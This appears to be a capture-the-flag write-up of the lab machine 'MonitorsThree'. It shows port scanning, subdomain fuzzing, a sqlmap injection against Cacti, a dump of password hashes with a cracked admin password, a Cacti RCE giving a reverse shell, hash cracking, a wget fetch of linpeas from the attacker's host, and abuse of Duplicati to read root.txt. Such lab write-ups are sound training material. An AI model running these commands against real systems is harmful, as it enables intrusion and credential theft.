---
layout: writeup
title: "MonitorsThree"
date: 2026-06-16
description: "Exploiting a Cacti SQL injection and RCE, then abusing a Duplicati backup service to write a root-owned file."
tags: [Box, medium, linux]
---

## Port Scanning

The initial step was to perform a full TCP port scan to identify open services and gather banner information:

```bash
nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN monitors3_scan 10.10.11.30
```

The scan shows SSH and HTTP (port 80) open and confirms the target IP.

![Scan results](/assets/images/monitors-three/124-1.png)
*Scan results*

The IP and hostname were added to `/etc/hosts` for proper name resolution.

Using Wappalyzer, the technologies used on the web application were identified.

![Wappalyzer technologies](/assets/images/monitors-three/124-2.png)
*Wappalyzer technologies*

## Directory & Subdomain Enumeration

Initial directory enumeration revealed an `/admin` page that returned a Forbidden status.

![Directory enumeration](/assets/images/monitors-three/124-3.png)
*Directory enumeration*

![Admin forbidden](/assets/images/monitors-three/124-4.png)
*Admin forbidden*

Subdomain enumeration with `ffuf` discovers `cacti.monitorsthree.htb`:

```bash
ffuf -u http://monitorsthree.htb/ -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 13560
```

![Subdomain discovery](/assets/images/monitors-three/124-5.png)
*Subdomain discovery*

## Cacti Application

The subdomain hosts a Cacti installation with a login page and a "Forgot Password" feature. Testing inputs suggested a potential SQL Injection vulnerability:

![Cacti login](/assets/images/monitors-three/124-6.png)
*Cacti login*

![Login.php page](/assets/images/monitors-three/124-7.png)
*Login.php page*

![Forgot password](/assets/images/monitors-three/124-8.png)
*Forgot password*

![Error handling hints SQLi](/assets/images/monitors-three/124-9.png)
*Error handling hints SQLi*

SQLMap was used to enumerate databases and extract user credentials:

```bash
sqlmap -r request_pass.txt -p username --dbs
```

![Databases discovered](/assets/images/monitors-three/124-10.png)
*Databases discovered*

Inspecting the `users` table revealed password hashes for several users:

```bash
+-----------+----------------------------------+-----------------------------+
| username  | password                         | email                       |
+-----------+----------------------------------+-----------------------------+
| admin     | 31a181c8372e3afc59dab863430610e8 | admin@monitorsthree.htb     |
| dthompson | 633b683cc128fe244b00f176c8a950f5 | dthompson@monitorsthree.htb |
| janderson | 1e68b6eb86b45f6d92f8f292428f77ac | janderson@monitorsthree.htb |
| mwatson   | c585d01f2eb3e6e1073e92023088a3dd | mwatson@monitorsthree.htb   |
+-----------+----------------------------------+-----------------------------+
```

Cracking the hashes yields working credentials:

**admin:greencacti2001**

![Cracked hash](/assets/images/monitors-three/124-11.png)
*Cracked hash*

Those credentials log in to the Cacti admin dashboard.

![Admin dashboard](/assets/images/monitors-three/124-12.png)
*Admin dashboard*

![Cacti main page](/assets/images/monitors-three/124-13.png)
*Cacti main page*

The Cacti instance lists three users:

![Cacti users](/assets/images/monitors-three/124-14.png)
*Cacti users*

## Exploitation – RCE in Cacti

Cacti version 1.2.26 has a known remote code execution vulnerability:

![RCE vulnerability](/assets/images/monitors-three/124-15.png)
*RCE vulnerability*

Using the exploit, a PHP payload was executed by uploading a `test.xml.gz` file:

![PHP command execution](/assets/images/monitors-three/124-16.png)
*PHP command execution*

![Upload payload](/assets/images/monitors-three/124-17.png)
*Upload payload*

This gave a reverse shell as `www-data`:

![Reverse shell www-data](/assets/images/monitors-three/124-18.png)
*Reverse shell www-data*

![Reverse shell active](/assets/images/monitors-three/124-19.png)
*Reverse shell active*

## Privilege Escalation

While enumerating the filesystem, the file `db.php` was discovered, which contained credentials for user `marcus`:

![db.php discovery](/assets/images/monitors-three/124-20.png)
*db.php discovery*

![db.php contents](/assets/images/monitors-three/124-21.png)
*db.php contents*

The hash for marcus was cracked using Hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --user
```

SSH access as marcus was then obtained:

![SSH access marcus](/assets/images/monitors-three/124-22.png)
*SSH access marcus*

Checking `.ssh` and stabilizing the connection:

![.ssh directory](/assets/images/monitors-three/124-23.png)
*.ssh directory*

![SSH stable session](/assets/images/monitors-three/124-24.png)
*SSH stable session*

LinPEAS was uploaded for privilege enumeration using a simple Python HTTP server:

`python3 -m http.server 1234` and `wget http://<YourIP>:1234/linpeas.sh`

Port enumeration revealed an internal service on port 8200. Using SSH port forwarding, it was accessed locally:

```bash
ssh -L 8200:127.0.0.1:8200 -i rsa marcus@monitorsthree.htb
```

![Port 8200 login](/assets/images/monitors-three/124-27.png)
*Port 8200 login*

Following the documented Duplicati exploit, the `Duplicati-server.sqlite` database was downloaded and analyzed to recover the server passphrase:

![Duplicati sqlite database](/assets/images/monitors-three/124-28.png)
*Duplicati sqlite database*

Passphrase after decoding & converting to hex:

**59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a**

![Passphrase extraction](/assets/images/monitors-three/124-29.png)
*Passphrase extraction*

![Intercept request modification](/assets/images/monitors-three/124-30.png)
*Intercept request modification*

With the correct passphrase, access to the Duplicati panel was obtained:

![Duplicati panel](/assets/images/monitors-three/124-31.png)
*Duplicati panel*

A backup job was created to restore the `root.txt` file to `/home/marcus/`:

![Backup configuration](/assets/images/monitors-three/124-32.png)
*Backup configuration*

![Backup selection](/assets/images/monitors-three/124-33.png)
*Backup selection*

![Backup execute](/assets/images/monitors-three/124-34.png)
*Backup execute*

![Restore files](/assets/images/monitors-three/124-35.png)
*Restore files*

Finally, the `root.txt` file was recovered via marcus's SSH session:

![root.txt recovered](/assets/images/monitors-three/124-36.png)
*root.txt recovered*
